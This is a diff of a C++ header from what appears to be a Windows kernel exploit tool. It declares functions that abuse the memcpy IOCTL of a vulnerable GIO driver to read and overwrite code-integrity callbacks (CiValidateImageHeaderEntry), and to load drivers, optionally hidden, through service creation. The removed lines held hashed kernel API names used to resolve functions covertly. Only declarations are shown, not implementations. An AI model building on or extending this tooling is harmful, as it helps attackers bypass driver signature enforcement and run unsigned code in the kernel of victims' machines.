@@ -13,6 +13,7 @@
 #include <ntstatus.h>
 #include <Psapi.h>
 #include <cstdio>   
+#include <string>
 #include <cstdint> 
 #include <shlwapi.h>  
 #include <vector>
@@ -20,41 +21,16 @@
 #pragma comment(lib, "shlwapi.lib")  
 #pragma comment(lib, "ntdll.lib") 
 
-#define MSR_IA32_VMX_PROCBASED_CTLS       0x482
-#define MSR_IA32_VMX_PROCBASED_CTLS2      0x48B
-#define MSR_IA32_VMX_TRUE_PROCBASED_CTLS  0x48E
-#define IA32_VMX_BASIC 0x480
-
-// Constants you need
-#define IA32_VMX_BASIC 0x480
-#define MSR_IA32_VMX_TRUE_PROCBASED_CTLS 0x48E
-#define MSR_IA32_VMX_PROCBASED_CTLS2 0x48B
-#define CPU_BASED_ACTIVATE_SECONDARY 0x80000000
-#define SECONDARY_ENABLE_EPT 0x2
-#define VECTOR_SYSCALL 0x80 // usually 0x80, adjust if you want INT 0x2e trap (0x2e)
-#define VMCS_LINK_POINTER 0x00002800
-#define MSR_BITMAP 0x00002000
-#define CPU_BASED_VM_EXEC_CONTROL 0x00004002
-#define SECONDARY_VM_EXEC_CONTROL 0x0000401E
-#define EXCEPTION_BITMAP 0x00004004
-#define HOST_RIP 0x00006C16
+static WCHAR DriverServiceName[MAX_PATH], LoaderServiceName[MAX_PATH];
 
 
-
-#define OBGetObjectType_HASH						0x6246ac8b9eb0daa4
-#define ExAllocatePoolWithTag_HASH					0xe7c4d473c919c038
-#define ExFreePoolWithTag_HASH						0x175d6b13f09b5f2b
-#define PsLookupProcessByProcessId_HASH				0xb7eac87c5d15bdab
-#define PsGetProcessImageFileName_HASH				0xb6824094e0503f10
-#define GetIoDriverObjectType_t_HASH				0xc0892385cfffae01
-#define PsGetProcessPeb_t_HASH						0x3c1a868596349c67
-#define IoThreadToProcess_t_HASH					0xe0cfa10ba8764872
-#define PsLoadedModuleList_HASH						0xbadf95a1217a5a5c
-
+#define FILE_DEVICE_GIO				(0xc350)
+#define IOCTL_GIO_MEMCPY			CTL_CODE(FILE_DEVICE_GIO, 0xa02, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define dev_name					L"\\Device\\GIO"
 
 struct seCiCallbacks_swap {
-	DWORD64 ciValidateImageHeaderEntry;
-	DWORD64 zwFlushInstructionCache;
+	uint64_t ciValidateImageHeaderEntry;
+	uint64_t zwFlushInstructionCache;
 };
 
 typedef struct _GIOMemcpyInput
@@ -65,63 +41,52 @@ typedef struct _GIOMemcpyInput
 } GIOMemcpyInput, * PGIOMemcpyInput;
 
 namespace vuln {
-
+	NTSTATUS WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden );
+	NTSTATUS TriggerExploit( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load );
 }
 
-
 namespace modules {
-
-	bool EnumerateKernelModules( const std::wstring& targetModuleName );
-
-	NTSTATUS FindKernelModule( PCCH ModuleName, void* ModuleBase );
-
-	ULONG_PTR GetKernelModuleAddress( const char* name );
-
-	uintptr_t GetKernelModuleBase();
-
-	ULONG_PTR GetKernelModuleAddress();
+	PVOID EnumerateKernelModules( const std::wstring& targetModuleName);
 
 	seCiCallbacks_swap get_CIValidate_ImageHeaderEntry();
-
-	LONG __stdcall VehHandler( PEXCEPTION_POINTERS pInfo );
 
 }
 
 namespace helpers {
 	
-	struct PatternMatch {
-		DWORD64 address;
-		DWORD64 target;
-		std::string symbol;
-
-		PatternMatch( DWORD64 addr, DWORD64 tgt, const std::string& sym )
-			: address( addr ), target( tgt ), symbol( sym ) {
-		}
-
-		PatternMatch() : address( 0 ), target( 0 ), symbol( "" ) {}
-	};
-
 	struct EntryPointInfo {
 		uintptr_t absoluteVA; // absolute virtual address in usermode
 		uintptr_t rva;        // relative virtual address (offset inside image)
 	};
 
-
-	DWORD64 find_pattern( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, const char* mask, size_t offsetAfterMatch );
-
-	uintptr_t find_pattern2( uint8_t* base, size_t size, const uint8_t* pattern, const char* mask );
-
-	uintptr_t resolve_lea_target( uintptr_t instr_addr );
-
-	DWORD64 findPattern( DWORD64* base, size_t size, const char* pattern, const char* mask );
-
-	bool CompareByte( const PUCHAR data, const PUCHAR pattern, UINT32 len );
-
 	bool CompareAnsiWide( const char* ansiStr, const wchar_t* wideStr );
 
 	uintptr_t GetProcAddress( void* hModule, const wchar_t* wAPIName );
 
-	std::vector<helpers::PatternMatch> find_lea_rax_patterns( DWORD64 imageBase, size_t imageSize, const unsigned char* pattern, const char* mask, size_t offsetAfterMatch );
+
+	bool find_pattern( const uint8_t* base, size_t scanSize, const uint8_t* pattern, size_t patternSize, uint64_t& outAddress );
+
+	void DeleteService( PWCHAR ServiceName );
+
+	uint64_t ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize );
+
+	NTSTATUS ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue );
+
+	NTSTATUS WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value );
+
+	NTSTATUS EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName );
+
+	NTSTATUS OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors );
+
+	NTSTATUS CreateDriverService( PWCHAR ServiceName, PWCHAR FileName );
+
+	int ConvertToNtPath( PWCHAR Dst, PWCHAR Src );
+
+	NTSTATUS LoadDriver( PWCHAR ServiceName );
+
+	NTSTATUS UnloadDriver( PWCHAR ServiceName );
+
+	void FileNameToServiceName( PWCHAR ServiceName, PWCHAR FileName );
 
 	EntryPointInfo GetEntryPoint( HMODULE moduleBase );
 
